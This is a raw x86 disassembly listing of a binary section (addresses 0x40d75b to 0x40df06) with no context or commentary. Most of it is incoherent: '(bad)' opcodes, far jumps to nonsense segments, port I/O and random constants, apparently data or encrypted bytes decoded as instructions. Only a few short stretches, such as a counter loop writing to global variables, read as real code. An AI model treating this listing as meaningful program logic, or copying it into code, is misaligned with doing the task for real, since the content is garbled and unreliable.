  40d75b:	sub    eax,0x4a2af480
  40d760:	push   edx
  40d761:	dec    BYTE PTR [ebp+edx*4-0x66ba3879]
  40d768:	xor    bh,BYTE PTR [ecx+0x20a1b3f5]
  40d76e:	(bad)  
  40d76f:	test   BYTE PTR [esi],0x3
  40d772:	retf   
  40d773:	loop   0x40d7c4
  40d775:	add    al,0x87
  40d777:	adc    BYTE PTR [edi-0x43735367],ah
  40d77d:	sbb    ebp,ebp
  40d77f:	jecxz  0x40d78c
  40d781:	cmp    DWORD PTR ds:0x5f0c3989,eax
  40d787:	data16 rcr BYTE PTR [esi+0x6a87e02],1
  40d78e:	sahf   
  40d78f:	ficom  DWORD PTR [eax+0x13]
  40d792:	and    BYTE PTR [edx+edx*1],bl
  40d795:	cwde   
  40d796:	adc    bh,BYTE PTR [esi+0x20]
  40d799:	mov    ah,0x47
  40d79b:	adc    ebx,DWORD PTR [ebx+0x7]
  40d79e:	jmp    0x791d:0xb6b809d3
  40d7a5:	lds    edx,FWORD PTR [esi]
  40d7a7:	lods   al,BYTE PTR ds:[esi]
  40d7a8:	shl    DWORD PTR [edi-0x56],1
  40d7ab:	ret    
  40d7ac:	jg     0x40d763
  40d7ae:	fs jle 0x40d7de
  40d7b1:	mov    ds:0x1efa63ab,al
  40d7b6:	(bad)
  40d7ba:	js     0x40d795
  40d7bc:	cmp    edi,0x33c
  40d7c2:	mov    DWORD PTR ds:0x42a7bd,0x14bd
  40d7cc:	jne    0x40dd11
  40d7d2:	and    eax,DWORD PTR ds:0x42a7c5
  40d7d8:	jmp    0x40da30
  40d7dd:	int    0xca
  40d7df:	(bad)  
  40d7e0:	into   
  40d7e1:	(bad)  
  40d7e3:	aad    0xc9
  40d7e5:	lea    edi,[esi+0x1c73e45d]
  40d7eb:	xor    al,BYTE PTR [esi+0x59]
  40d7ee:	test   eax,0x7e357878
  40d7f3:	js     0x40d86d
  40d7f5:	cbw    
  40d7f7:	inc    edx
  40d7f8:	pop    ecx
  40d7f9:	add    BYTE PTR [ebp+0x55],al
  40d7fc:	push   es
  40d7fd:	lods   eax,DWORD PTR ds:[esi]
  40d7fe:	jne    0x40d83c
  40d800:	fisttp QWORD PTR [edi]
  40d802:	adc    BYTE PTR [edi],al
  40d804:	add    ebp,0x37
  40d807:	sahf   
  40d808:	push   eax
  40d809:	xor    ch,bl
  40d80b:	push   esi
  40d80c:	inc    ebp
  40d80d:	test   al,0x9e
  40d80f:	ja     0x40d86b
  40d811:	leave  
  40d812:	xchg   ebp,eax
  40d813:	pusha  
  40d814:	outs   dx,BYTE PTR ds:[esi]
  40d815:	cmp    esi,edi
  40d817:	inc    edx
  40d818:	mov    esi,0xf269a69
  40d81d:	rcl    ah,cl
  40d81f:	pop    esp
  40d820:	stc    
  40d821:	das    
  40d822:	sub    al,0x47
  40d824:	adc    bh,BYTE PTR [ebx-0x7a]
  40d827:	mov    edx,0xefc8ef90
  40d82d:	div    BYTE PTR [esi-0x6dd261a9]
  40d833:	hlt    
  40d834:	sar    ebp,cl
  40d836:	xchg   edx,eax
  40d837:	pop    ebp
  40d838:	cmp    BYTE PTR gs:[edx+0x45],al
  40d83c:	inc    eax
  40d83d:	loopne 0x40d8a4
  40d83f:	call   0x63f:0xad168783
  40d846:	pop    es
  40d847:	leave  
  40d848:	mov    ecx,esi
  40d84a:	add    al,0xe8
  40d84c:	sahf   
  40d84d:	xchg   DWORD PTR [edx+0x46ce862f],eax
  40d853:	ficomp WORD PTR [ebx-0x41]
  40d856:	in     eax,0xaf
  40d858:	xor    eax,0x71ef3780
  40d85d:	mov    ah,0xf4
  40d85f:	cmp    eax,0x4293e027
  40d864:	jns    0x40d8db
  40d866:	jecxz  0x40d824
  40d868:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d869:	mov    ?,WORD PTR es:0x8301f2fc
  40d870:	and    dl,BYTE PTR [edx+0x30ca647]
  40d876:	xchg   esi,eax
  40d877:	cmp    bl,BYTE PTR [edx]
  40d879:	loop   0x40d860
  40d87b:	jae    0x40d884
  40d87d:	mov    dh,bh
  40d87f:	xchg   esp,eax
  40d880:	mov    bl,0x4d
  40d882:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d883:	into   
  40d884:	(bad)  
  40d885:	shl    DWORD PTR [esi],1
  40d887:	push   0x55eb8cbb
  40d88c:	xor    al,0xed
  40d88e:	mov    ah,0x91
  40d890:	xchg   ecx,esi
  40d892:	add    DWORD PTR [ecx+0x1e4f3cdc],edi
  40d898:	aad    0x37
  40d89a:	retf   0x2091
  40d89d:	adc    al,0x67
  40d89f:	mov    ebp,0x8f2c79c3
  40d8a4:	cli    
  40d8a5:	dec    esi
  40d8a6:	xchg   edi,eax
  40d8a7:	mov    ds:0x78d0d28d,al
  40d8ac:	idiv   DWORD PTR cs:[ecx-0x47]
  40d8b0:	push   ds
  40d8b1:	(bad)  
  40d8b2:	pop    ebx
  40d8b3:	sub    al,0xa7
  40d8b5:	mov    al,0x7c
  40d8b7:	in     al,dx
  40d8b8:	jg     0x40d848
  40d8ba:	lock pop ss
  40d8bc:	iret   
  40d8bd:	es mov bl,0xc5
  40d8c0:	lods   eax,DWORD PTR ds:[esi]
  40d8c1:	or     al,0xa3
  40d8c3:	xor    dh,ch
  40d8c5:	add    al,0x71
  40d8c7:	and    eax,0xc04387f
  40d8cc:	ror    DWORD PTR [ebp+edi*2-0x6c77b59d],cl
  40d8d3:	call   0x513653b7
  40d8d8:	ins    BYTE PTR es:[edi],dx
  40d8d9:	sar    BYTE PTR [esi],cl
  40d8db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8dc:	iret   
  40d8dd:	push   ebp
  40d8de:	ret    0x79f0
  40d8e1:	mov    dh,0x83
  40d8e3:	push   eax
  40d8e4:	adc    esi,ecx
  40d8e6:	popf   
  40d8e7:	fnsave [ecx+0x30]
  40d8ea:	and    DWORD PTR [edx+0x19a4140d],esp
  40d8f0:	gs mov ch,0x1a
  40d8f3:	stos   BYTE PTR es:[edi],al
  40d8f4:	fdivr  DWORD PTR [ecx*2+0x411cb4f]
  40d8fb:	mov    BYTE PTR [esi-0x3b863f2b],cl
  40d901:	push   edi
  40d902:	or     ecx,DWORD PTR [esi-0x6cc13e8a]
  40d908:	cmp    DWORD PTR [ecx],0xffffffed
  40d90b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d90c:	and    ch,ch
  40d90e:	cmp    DWORD PTR [edi],0xa5627bb2
  40d914:	jge    0x40d8c4
  40d916:	dec    edx
  40d917:	ret    
  40d918:	sbb    edi,DWORD PTR [edi-0x2]
  40d91b:	xchg   edi,eax
  40d91c:	xchg   ebp,eax
  40d91d:	fbld   TBYTE PTR [edx-0x80]
  40d920:	jl     0x40d95e
  40d922:	and    esp,DWORD PTR [eax+eiz*4-0x15c5de53]
  40d929:	xchg   edx,eax
  40d92a:	inc    eax
  40d92b:	retf   0xadb7
  40d92e:	sbb    DWORD PTR [edi],ebx
  40d930:	fwait
  40d931:	aas    
  40d932:	in     al,0x68
  40d934:	in     al,dx
  40d935:	mov    ah,BYTE PTR [eax-0x6a498ed5]
  40d93b:	sar    BYTE PTR [ebp+0x157ca6da],1
  40d941:	add    ah,BYTE PTR [edx+0x57888338]
  40d947:	xchg   esi,eax
  40d948:	add    esi,DWORD PTR [ebx+0x3000cc16]
  40d94e:	or     eax,0xb9464173
  40d953:	pop    ecx
  40d954:	adc    al,0xad
  40d956:	cmp    ah,bl
  40d958:	aas    
  40d959:	and    DWORD PTR [edx],0x11
  40d95c:	ror    dh,0xaf
  40d95f:	ror    BYTE PTR [esi-0x2c],cl
  40d962:	aas    
  40d963:	sbb    al,0xa5
  40d965:	stos   DWORD PTR es:[edi],eax
  40d966:	ins    DWORD PTR es:[edi],dx
  40d967:	pop    eax
  40d968:	xor    esp,esi
  40d96a:	test   BYTE PTR [edi],cl
  40d96c:	leave  
  40d96d:	test   eax,0xde48239e
  40d972:	mov    ds:0x9a88e83e,al
  40d977:	jnp    0x40d949
  40d979:	jl     0x40d9a1
  40d97b:	xor    ch,ch
  40d97d:	adc    al,0xef
  40d97f:	lds    ecx,FWORD PTR [ecx]
  40d981:	or     bl,ah
  40d983:	imul   eax,DWORD PTR [eax-0xbe9bf1e],0x7d8f189
  40d98d:	aad    0xf2
  40d98f:	cwde   
  40d990:	inc    ebx
  40d991:	jl     0x40d9d2
  40d993:	mov    esp,DWORD PTR [ebx]
  40d995:	rcl    ebx,1
  40d997:	lock add ch,bl
  40d99a:	fs cmp eax,0x375110a6
  40d9a0:	(bad)  
  40d9a1:	iret   
  40d9a2:	(bad)  [ebx+0x3a]
  40d9a5:	(bad)  [eax-0x67]
  40d9a8:	xor    DWORD PTR [edi],ebp
  40d9aa:	fwait
  40d9ab:	jle    0x40d9c3
  40d9ad:	and    ah,BYTE PTR [ebx-0x52]
  40d9b0:	jmp    0x40d956
  40d9b2:	lahf   
  40d9b3:	inc    ebx
  40d9b4:	pop    ebp
  40d9b5:	rcr    DWORD PTR [esi-0x33],1
  40d9b8:	mov    bl,0x9e
  40d9ba:	mov    ds:0x6e1e345a,eax
  40d9bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d9c0:	aad    0xf3
  40d9c2:	repz ret 0xdb9b
  40d9c6:	and    eax,0xd81c3803
  40d9cb:	push   ds
  40d9cc:	add    eax,0xed692109
  40d9d1:	inc    esi
  40d9d2:	pusha  
  40d9d3:	lods   eax,DWORD PTR ds:[esi]
  40d9d4:	xor    eax,0xf22aa444
  40d9d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d9da:	mov    edx,0xcf2f1ba1
  40d9df:	mov    edx,0xc67700a7
  40d9e4:	jae    0x40d966
  40d9e6:	scas   eax,DWORD PTR es:[edi]
  40d9e7:	cmc    
  40d9e8:	cmovb  eax,DWORD PTR [esi]
  40d9eb:	leave  
  40d9ec:	dec    ebp
  40d9ed:	sar    DWORD PTR [eax-0x29],cl
  40d9f0:	pop    ss
  40d9f1:	out    dx,eax
  40d9f2:	mov    edx,0xb11ed891
  40d9f7:	mov    cl,0x7f
  40d9f9:	or     eax,0x3b4db2ff
  40d9fe:	fsub   QWORD PTR ds:0x2fa6efee
  40da04:	ret    
  40da05:	popa   
  40da06:	mov    eax,ds:0x7b8c1845
  40da0b:	sbb    edx,DWORD PTR [ebp-0x6c]
  40da0e:	xlat   BYTE PTR ds:[ebx]
  40da0f:	jl     0x40da44
  40da11:	aas    
  40da12:	sbb    eax,0xf41fce2e
  40da17:	sbb    dl,ah
  40da19:	paddusb mm2,QWORD PTR [esi+0x51]
  40da1d:	out    dx,eax
  40da1e:	mov    ebp,0xefda0e3e
  40da23:	xor    edx,edi
  40da25:	cmp    dl,ah
  40da27:	test   DWORD PTR [ecx-0x6e],esp
  40da2a:	cdq    
  40da2b:	pop    ebx
  40da2c:	pop    edi
  40da2d:	cmp    BYTE PTR [esp],bl
  40da30:	and    DWORD PTR [ebp+0x8],0x0
  40da34:	mov    eax,ds:0x42a831
  40da39:	sbb    eax,DWORD PTR ds:0x42a809
  40da3f:	mov    ds:0x42a831,eax
  40da44:	mov    eax,DWORD PTR [ebp-0x8]
  40da47:	xor    DWORD PTR ds:0x42a7f1,0x42a7bd
  40da51:	sub    eax,DWORD PTR [ebp+0x8]
  40da54:	or     DWORD PTR ds:0x42a801,0xc38
  40da5e:	push   eax
  40da5f:	adc    DWORD PTR ds:0x42a771,0x6147
  40da69:	mov    eax,DWORD PTR [ebp-0x4]
  40da6c:	jmp    0x40dcc4
  40da71:	enter  0xc6c0,0x3c
  40da75:	(bad)  
  40da76:	ret    0xd4da
  40da79:	push   cs
  40da7a:	in     al,dx
  40da7b:	pop    edi
  40da7c:	dec    esi
  40da7d:	xchg   edx,eax
  40da7e:	sbb    cl,BYTE PTR [ecx+ebx*1+0x16]
  40da82:	scas   al,BYTE PTR es:[edi]
  40da83:	js     0x40dafd
  40da85:	xor    eax,0xc678787e
  40da8a:	(bad)  
  40da8b:	adc    eax,0xfb1e1380
  40da90:	loopne 0x40da84
  40da92:	jg     0x40da9d
  40da94:	outs   dx,BYTE PTR ds:[esi]
  40da95:	cwde   
  40da96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da97:	cs pop edx
  40da99:	(bad)  
  40da9a:	xchg   ebx,eax
  40da9b:	std    
  40da9c:	cdq    
  40da9d:	jle    0x40da8a
  40da9f:	pop    edi
  40daa0:	or     eax,DWORD PTR [esi+0x7cda84a8]
  40daa6:	dec    ecx
  40daa7:	push   ebp
  40daa8:	or     bh,BYTE PTR [ebp+0x4d]
  40daab:	retf   
  40daac:	pop    ebx
  40daad:	iret   
  40daae:	adc    DWORD PTR [ecx+0x4b636c27],edi
  40dab4:	pop    esp
  40dab5:	mov    eax,0x6b474423
  40daba:	push   ecx
  40dabb:	xchg   DWORD PTR [ecx+0x64af6d5e],edx
  40dac1:	xchg   edx,eax
  40dac2:	shl    DWORD PTR [ecx],1
  40dac4:	inc    esi
  40dac5:	dec    esp
  40dac6:	inc    ebp
  40dac7:	arpl   WORD PTR [edx],si
  40dac9:	mov    ebx,0x69b93e8e
  40dace:	jl     0x40daf9
  40dad0:	test   al,0xfc
  40dad2:	lods   al,BYTE PTR ds:[esi]
  40dad3:	ror    al,cl
  40dad5:	pusha  
  40dad6:	shl    DWORD PTR [esi+0x1c],0x68
  40dada:	pop    esi
  40dadb:	fmul   st,st(6)
  40dadd:	outs   dx,DWORD PTR ds:[esi]
  40dade:	jo     0x40db44
  40dae0:	dec    esp
  40dae1:	mov    edx,eax
  40dae3:	cmc    
  40dae4:	lea    esi,[edx-0x12]
  40dae7:	cmp    eax,ecx
  40dae9:	mov    cl,0x8d
  40daeb:	and    eax,0x34ea2389
  40daf0:	shl    DWORD PTR [esi],0x36
  40daf3:	mov    ds:0x19bc64ac,al
  40daf8:	adc    al,0x77
  40dafa:	jnp    0x40daa1
  40dafc:	sti    
  40dafd:	inc    edi
  40dafe:	jbe    0x40dad0
  40db00:	or     BYTE PTR [edx+0x56],dh
  40db03:	xchg   DWORD PTR [esi+0x24],esi
  40db06:	lea    edx,[eax]
  40db08:	pop    ds
  40db09:	jns    0x40db5c
  40db0b:	xor    DWORD PTR [edx+0x18],edx
  40db0e:	mov    eax,ds:0x5a50dfb
  40db13:	and    eax,0x3838078d
  40db18:	mov    edi,0x280a41e7
  40db1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db1e:	aam    0x92
  40db20:	xor    ah,al
  40db22:	or     edi,DWORD PTR [ebx+0x6e]
  40db25:	in     al,dx
  40db26:	stos   DWORD PTR es:[edi],eax
  40db27:	neg    DWORD PTR [ebx-0x2d]
  40db2a:	xchg   ebp,eax
  40db2b:	mov    dl,0x93
  40db2d:	sahf   
  40db2e:	scas   eax,DWORD PTR es:[edi]
  40db2f:	fisubr DWORD PTR [bx+si-0x2160]
  40db34:	daa    
  40db35:	pop    es
  40db36:	call   0xd659:0xd901406d
  40db3d:	or     BYTE PTR [esi-0x71b7038c],bh
  40db43:	ficom  WORD PTR [ebx+edx*2]
  40db46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db47:	fwait
  40db48:	cli    
  40db49:	daa    
  40db4a:	jge    0x40dae0
  40db4c:	pop    es
  40db4d:	jp     0x40db6b
  40db4f:	adc    eax,0x8dfa73a4
  40db54:	push   esi
  40db55:	sub    DWORD PTR [ebp-0x1301ae42],0x1d0268d9
  40db5f:	inc    ebx
  40db60:	pop    es
  40db61:	push   eax
  40db62:	cmc    
  40db63:	cmp    ah,BYTE PTR [ecx+esi*2+0x5]
  40db67:	pop    ebx
  40db68:	ror    BYTE PTR [esp+ebp*8-0xf],1
  40db6c:	call   FWORD PTR [esi-0x2088148]
  40db72:	cli    
  40db73:	(bad)  
  40db74:	enter  0xc7fd,0x13
  40db78:	push   0x10
  40db7a:	and    BYTE PTR [ecx-0x279a1a],0x66
  40db81:	jmp    0x40db0c
  40db83:	into   
  40db84:	scas   al,BYTE PTR es:[edi]
  40db85:	lods   eax,DWORD PTR ds:[esi]
  40db86:	jge    0x40dbc9
  40db88:	into   
  40db89:	dec    eax
  40db8a:	outs   dx,BYTE PTR ds:[esi]
  40db8b:	inc    edi
  40db8c:	gs xor eax,0x7be35e83
  40db92:	or     ecx,eax
  40db94:	xchg   ecx,eax
  40db95:	push   ss
  40db96:	sbb    eax,0x25dbf84f
  40db9b:	pop    ebx
  40db9c:	or     eax,0x37dd3aff
  40dba1:	iret   
  40dba2:	fwait
  40dba3:	or     BYTE PTR [ebp+0x4e986a3],0x47
  40dbaa:	loopne 0x40dbc1
  40dbac:	lock adc eax,0xf39ecc2c
  40dbb2:	rol    ah,1
  40dbb4:	mov    ch,0x5f
  40dbb6:	shr    bl,0x1e
  40dbb9:	jmp    0x4c0d:0x98111c6e
  40dbc0:	cmovge edx,DWORD PTR [ebx]
  40dbc3:	inc    eax
  40dbc4:	hlt    
  40dbc5:	cmp    BYTE PTR [ecx],cl
  40dbc7:	mov    BYTE PTR [ebx+0x2],cl
  40dbca:	imul   esp,edx,0x94c05f85
  40dbd0:	in     eax,0x7
  40dbd2:	outs   dx,DWORD PTR ds:[esi]
  40dbd3:	dec    edi
  40dbd4:	push   esp
  40dbd5:	cmp    al,0x81
  40dbd7:	retf   
  40dbd8:	adc    al,0xf1
  40dbda:	adc    BYTE PTR [edx-0x54],bl
  40dbdd:	dec    ebx
  40dbde:	lods   al,BYTE PTR ds:[esi]
  40dbdf:	jns    0x40db7f
  40dbe1:	pop    ss
  40dbe2:	in     eax,0x9
  40dbe4:	fld    DWORD PTR [ecx+0x7c9b713]
  40dbea:	fsubp  st(4),st
  40dbec:	jb     0x40dc69
  40dbee:	cmp    ah,BYTE PTR [eax]
  40dbf0:	lods   al,BYTE PTR ds:[esi]
  40dbf1:	fcomp  st(0)
  40dbf3:	into   
  40dbf4:	(bad)  
  40dbf5:	lods   al,BYTE PTR ds:[esi]
  40dbf6:	mov    dh,0xa1
  40dbf8:	ds test DWORD PTR gs:[edi],esi
  40dbfc:	add    eax,0x6124b911
  40dc01:	jmp    0x9273:0x11bb4051
  40dc08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc09:	ror    BYTE PTR ds:0xe2ea2741,1
  40dc0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc10:	adc    al,0x1c
  40dc12:	mov    DWORD PTR [esp+ebx*8],esp
  40dc15:	lods   eax,DWORD PTR ds:[esi]
  40dc16:	aaa    
  40dc17:	xlat   BYTE PTR ds:[ebx]
  40dc18:	push   eax
  40dc19:	pop    ebx
  40dc1a:	in     eax,0xfc
  40dc1c:	push   eax
  40dc1d:	ror    BYTE PTR [ecx-0x6aae9e4b],cl
  40dc23:	ret    0x3f19
  40dc26:	jmp    0xcd84f607
  40dc2b:	cmc    
  40dc2c:	iret   
  40dc2d:	inc    ecx
  40dc2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc2f:	dec    ecx
  40dc30:	dec    eax
  40dc31:	cdq    
  40dc32:	fimul  DWORD PTR [ecx+0x3f]
  40dc35:	ins    DWORD PTR es:[edi],dx
  40dc36:	adc    BYTE PTR [edx-0x34b759f5],bh
  40dc3c:	add    BYTE PTR [edx-0x61c24584],ch
  40dc42:	cmp    al,0x63
  40dc44:	and    ch,dh
  40dc46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc47:	jmp    0xc126:0xadd19800
  40dc4e:	shr    dl,cl
  40dc50:	inc    eax
  40dc51:	mov    ds:0x3505ab68,eax
  40dc56:	push   ds
  40dc57:	cmp    bl,BYTE PTR [ecx-0x52]
  40dc5a:	cld    
  40dc5b:	mov    DWORD PTR [edi+0x433b04af],ebp
  40dc61:	and    eax,0x5e9665a8
  40dc66:	and    ah,BYTE PTR [eax]
  40dc68:	mov    ?,esp
  40dc6a:	or     al,0x1b
  40dc6c:	bound  edx,QWORD PTR [ebp-0x4898c89f]
  40dc72:	mov    ebp,0x94cb49ac
  40dc77:	or     eax,0xc20efad3
  40dc7c:	mov    esp,0x215bf7f3
  40dc81:	outs   dx,BYTE PTR ds:[esi]
  40dc82:	dec    eax
  40dc83:	(bad)  
  40dc84:	push   esp
  40dc85:	inc    edi
  40dc86:	dec    edi
  40dc87:	mov    esi,0x8e1056c2
  40dc8c:	mov    al,ds:0x580d654f
  40dc91:	xor    DWORD PTR [ebx-0x314ce172],edx
  40dc97:	and    eax,0x8168ea39
  40dc9c:	mov    edx,0xc733026a
  40dca1:	frstor [ecx]
  40dca3:	repnz ss cli 
  40dca6:	cmp    eax,0xc30f4332
  40dcab:	in     al,0x40
  40dcad:	mov    dh,0xfd
  40dcaf:	jecxz  0x40dc68
  40dcb1:	jl     0x40dc74
  40dcb3:	ins    BYTE PTR es:[edi],dx
  40dcb4:	mov    bl,0xf
  40dcb6:	stc    
  40dcb7:	repz push esi
  40dcb9:	cmp    DWORD PTR [esi+edx*8],esp
  40dcbc:	xchg   edx,eax
  40dcbd:	pause  
  40dcbf:	push   ss
  40dcc0:	push   eax
  40dcc1:	sbb    al,0xcf
  40dcc3:	loop   0x40dcc8
  40dcc5:	inc    ebp
  40dcc6:	or     BYTE PTR [ecx+0x42a88105],al
  40dccc:	add    BYTE PTR [edx+0x29],ch
  40dccf:	add    BYTE PTR [eax],al
  40dcd1:	push   eax
  40dcd2:	adc    DWORD PTR ds:0x42a75d,0x7658
  40dcdc:	call   0x40e99f
  40dce1:	mov    DWORD PTR ds:0x42a7b5,0x7bae
  40dceb:	inc    DWORD PTR [ebp+0x8]
  40dcee:	cmp    DWORD PTR [ebp+0x8],0x52
  40dcf2:	mov    DWORD PTR ds:0x42a831,0x71fa
  40dcfc:	jb     0x40da34
  40dd02:	mov    DWORD PTR ds:0x42a83d,0x568b
  40dd0c:	jmp    0x40e979
  40dd11:	cmp    edi,0x1a2
  40dd17:	jne    0x40e497
  40dd1d:	sbb    DWORD PTR ds:0x42a7b9,edx
  40dd23:	mov    DWORD PTR [ebp-0x60],0xf89c853c
  40dd2a:	mov    eax,DWORD PTR [ebp-0x4]
  40dd2d:	mov    DWORD PTR [ebp-0x5c],eax
  40dd30:	mov    eax,DWORD PTR [ebp-0x8]
  40dd33:	mov    DWORD PTR [ebp-0x58],eax
  40dd36:	movzx  eax,WORD PTR ds:0x42a7b1
  40dd3d:	and    DWORD PTR ds:0x42a781,eax
  40dd43:	mov    eax,DWORD PTR [ebp-0xc]
  40dd46:	adc    DWORD PTR ds:0x42a871,0x42a87d
  40dd50:	xor    eax,esi
  40dd52:	jmp    0x40dfaa
  40dd57:	rol    eax,0x3e
  40dd5a:	leave  
  40dd5b:	leave  
  40dd5c:	leave  
  40dd5d:	leave  
  40dd5e:	rcr    BYTE PTR [ebx+0x66],0x3b
  40dd62:	inc    esi
  40dd63:	retf   
  40dd64:	daa    
  40dd65:	add    DWORD PTR [ebx],ecx
  40dd67:	shr    DWORD PTR [eax+edi*2+0x787e3578],cl
  40dd6e:	js     0x40dd07
  40dd70:	mov    esi,0x62ebdd64
  40dd75:	adc    eax,DWORD PTR [ebp-0x40612967]
  40dd7b:	cmp    DWORD PTR [bx+0x26],eax
  40dd7f:	pushf  
  40dd80:	sub    eax,0xa9e92bb8
  40dd85:	std    
  40dd86:	sub    al,0x4b
  40dd88:	cmp    al,BYTE PTR [edi+0x6b]
  40dd8b:	outs   dx,DWORD PTR ds:[esi]
  40dd8c:	jg     0x40ddd4
  40dd8e:	scas   eax,DWORD PTR es:[edi]
  40dd8f:	dec    edx
  40dd90:	cwde   
  40dd91:	int3   
  40dd92:	fcomi  st,st(6)
  40dd94:	sub    eax,0x24f55b3e
  40dd99:	cs add al,0x6d
  40dd9c:	fiadd  WORD PTR [edi+0x18]
  40dd9f:	js     0x40de1a
  40dda1:	push   0xc36ee0e4
  40dda6:	push   ebx
  40dda7:	dec    eax
  40dda8:	xlat   BYTE PTR ds:[ebx]
  40dda9:	cmp    ebx,DWORD PTR [ecx-0x31]
  40ddac:	lock hlt 
  40ddae:	mov    esp,DWORD PTR ds:0xf70d8f70
  40ddb4:	and    BYTE PTR [eax*1-0x769c3140],ch
  40ddbb:	not    DWORD PTR [ecx+0x10]
  40ddbe:	and    eax,0xe0cdf332
  40ddc3:	addr16 mul ah
  40ddc6:	add    DWORD PTR [edx],esi
  40ddc8:	loop   0x40dd61
  40ddca:	sbb    bl,cl
  40ddcc:	aad    0x67
  40ddce:	aas    
  40ddcf:	out    0xd1,al
  40ddd1:	ds dec esp
  40ddd3:	pop    es
  40ddd4:	add    BYTE PTR [ebp-0x58],bh
  40ddd7:	sbb    bh,BYTE PTR ds:0x2a28ea38
  40dddd:	sub    BYTE PTR [ebx],0x93
  40dde0:	xchg   edi,eax
  40dde1:	aad    0x30
  40dde3:	leave  
  40dde4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dde5:	(bad)  
  40dde6:	cld    
  40dde7:	xchg   ecx,eax
  40dde8:	dec    edx
  40dde9:	jo     0x40dd6f
  40ddeb:	rcr    DWORD PTR [ebp-0x26fe879b],cl
  40ddf1:	bound  ecx,QWORD PTR [edi-0x7dab2c1a]
  40ddf7:	xchg   edx,eax
  40ddf8:	jl     0x40ddd7
  40ddfa:	mov    ecx,0x891beb5c
  40ddff:	mov    cl,0x64
  40de01:	jecxz  0x40de24
  40de03:	scas   eax,DWORD PTR es:[edi]
  40de04:	test   DWORD PTR cs:0x7bfbc02b,0xd212f5a4
  40de0f:	jae    0x40ddaa
  40de11:	stc    
  40de12:	xchg   esi,eax
  40de13:	icebp  
  40de14:	daa    
  40de15:	(bad)  
  40de17:	jo     0x40de1c
  40de19:	aaa    
  40de1a:	in     al,dx
  40de1b:	dec    ebx
  40de1c:	xchg   BYTE PTR [ecx],ah
  40de1e:	cmc    
  40de1f:	sar    BYTE PTR [esi+0x23],1
  40de22:	dec    esi
  40de23:	mov    dh,0x72
  40de25:	jbe    0x40de62
  40de27:	imul   edi,ecx,0xb3ad0bc5
  40de2d:	inc    ebp
  40de2e:	mov    cl,0x15
  40de30:	in     al,dx
  40de31:	cmp    eax,0x4a1bd555
  40de36:	cmp    ebp,DWORD PTR [edi+0x53885faf]
  40de3c:	les    ebx,FWORD PTR [edi+edx*4]
  40de3f:	push   cs
  40de40:	or     DWORD PTR [edx],ebx
  40de42:	push   ss
  40de43:	jl     0x40de4f
  40de45:	pop    edx
  40de46:	aad    0x82
  40de48:	jle    0x40deac
  40de4a:	ins    BYTE PTR es:[edi],dx
  40de4b:	mov    dl,0x1
  40de4d:	leave  
  40de4e:	nop
  40de4f:	sbb    BYTE PTR [ecx-0x41],ah
  40de52:	dec    esi
  40de53:	sub    BYTE PTR [eax],al
  40de55:	std    
  40de56:	pop    es
  40de57:	aas    
  40de58:	xchg   edx,eax
  40de59:	in     eax,0x79
  40de5b:	scas   al,BYTE PTR es:[edi]
  40de5c:	outs   dx,BYTE PTR ds:[esi]
  40de5d:	xchg   ebx,eax
  40de5e:	pop    es
  40de5f:	xchg   esp,eax
  40de60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de61:	and    eax,0x9f1923
  40de66:	not    BYTE PTR [ebp+0xc]
  40de69:	cld    
  40de6a:	or     BYTE PTR [edx+0x1489148a],ch
  40de70:	mov    dh,0xef
  40de72:	pop    edx
  40de73:	jl     0x40de17
  40de75:	adc    ecx,DWORD PTR [ebx]
  40de77:	mov    eax,ds:0xacaa4e5f
  40de7c:	lmsw   WORD PTR [esi]
  40de7f:	sub    edi,ebp
  40de81:	push   edi
  40de82:	rol    bh,cl
  40de84:	shl    esp,cl
  40de86:	scas   al,BYTE PTR es:[edi]
  40de87:	jo     0x40de84
  40de89:	and    ebx,DWORD PTR [ecx+esi*4-0x201a6e64]
  40de90:	outs   dx,DWORD PTR ds:[esi]
  40de91:	and    cl,BYTE PTR [ecx]
  40de93:	xor    al,0x32
  40de95:	push   esi
  40de96:	outs   dx,DWORD PTR ds:[esi]
  40de97:	inc    esi
  40de98:	dec    ebp
  40de99:	popf   
  40de9a:	push   eax
  40de9b:	fsub   DWORD PTR [ebx*2-0x16d980d6]
  40dea2:	jg     0x40de4d
  40dea4:	out    0xec,al
  40dea6:	test   BYTE PTR [esi-0x2c],bl
  40dea9:	add    eax,0x4d99ee39
  40deae:	movq   QWORD PTR [esi-0x7eb37467],mm1
  40deb5:	jns    0x40de4b
  40deb7:	jmp    0x40de6c
  40deb9:	mov    edi,0xb4af710b
  40debe:	repnz and esi,eax
  40dec1:	push   edi
  40dec2:	mov    ds:0x801b210d,al
  40dec7:	mov    ebp,0xad70f3f2
  40decc:	xor    eax,DWORD PTR [edx-0x6cd6d330]
  40ded2:	cmp    eax,0x6e1a70ef
  40ded7:	sahf   
  40ded8:	xchg   esp,eax
  40ded9:	inc    esp
  40deda:	lods   eax,DWORD PTR ds:[esi]
  40dedb:	mov    eax,ds:0xe2b557dd
  40dee0:	mov    ch,0x5b
  40dee2:	call   0xf275b9eb
  40dee7:	nop
  40dee8:	push   0xfffffff3
  40deea:	and    ebp,edi
  40deec:	mov    edx,0x3db7be02
  40def1:	sub    dl,BYTE PTR [edx-0xc]
  40def4:	retf   0x8af5
  40def7:	jne    0x40df21
  40def9:	(bad)  
  40defa:	(bad)  
  40defb:	pop    ebx
  40defc:	jbe    0x40de9c
  40defe:	(bad)  
  40deff:	or     al,0xd8
  40df01:	and    ch,BYTE PTR [edi+0x71]
  40df04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df05:	pop    es
  40df06:	mov    ds:0x956a3c7f,eax
